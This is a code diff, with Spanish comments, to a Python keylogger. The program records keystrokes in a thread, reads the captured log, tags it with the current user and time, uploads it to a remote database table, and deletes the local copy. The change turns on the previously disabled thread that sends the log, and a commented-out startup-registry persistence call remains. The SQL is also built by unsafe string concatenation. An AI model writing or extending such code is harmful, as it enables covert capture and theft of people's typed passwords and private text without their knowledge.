@@ -328,30 +328,32 @@ def SendLog():
         except:
             exito = False
             print("Error al iniciar sesión [DataBase]")
-
         def UpdateUser():
-            pathO = logKeyPath()+ LogName()
-            pathN = logKeyPath()+ "db.txt"
-            os.rename(pathO, pathN)
-            # Abre el archivo
-            f = open (pathN ,'r')
-            data = f.read()
-            print(data)
-            # Tiempo
-            T = datetime.datetime.now()
-            currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
-            sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES('"+str(getuser())+"','"+currentTime+"','"+data+"')"    # Inserta nuevos datos 
-            #sql = "Update NameTabla SET key = '{}'WHERE id={}".format(name, id)
-
-            f.close()
             try:
-                cursor.execute(sql) # Ejecuta virtual
-                connection.commit() # Se guardan virtual 
-                print("[Database] Se subieron los datos correctamente")
-                    # Elimina Registro Key
-                os.remove(pathN)
+                pathO = logKeyPath()+ LogName()
+                pathN = logKeyPath()+ "db.txt"
+                os.rename(pathO, pathN)
+                # Abre el archivo
+                f = open (pathN ,'r')
+                data = f.read()
+                print(data)
+                # Tiempo
+                T = datetime.datetime.now()
+                currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
+                sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES('"+str(getuser())+"','"+currentTime+"','"+data+"')"    # Inserta nuevos datos 
+                #sql = "Update NameTabla SET key = '{}'WHERE id={}".format(name, id)
+                f.close()
+                try:
+                    cursor.execute(sql) # Ejecuta virtual
+                    connection.commit() # Se guardan virtual 
+                    print("[Database] Se subieron los datos correctamente")
+                        # Elimina Registro Key
+                    os.remove(pathN)
+                except:
+                    print("[Database] Error al subir los datos")
+
             except:
-                print("[Database] Error al subir los datos")
+                print("[DataBase] No se encuentra el archivo")
 
         if (exito): # Solo se ejecutará si se inició correctamente la base de datos
             UpdateUser()
@@ -484,8 +486,8 @@ if __name__ == '__main__':
     #addStartup()    # Modifica registro de arranque
     p1 = threading.Thread(target=KeyLogger)   # Registra teclas
 
-    #p2 = threading.Thread(target=SendLog)   # Enviar Registro
-    #p2.start()
+    p2 = threading.Thread(target=SendLog)   # Enviar Registro
+    p2.start()
     p1.start()
     p1.join()
 
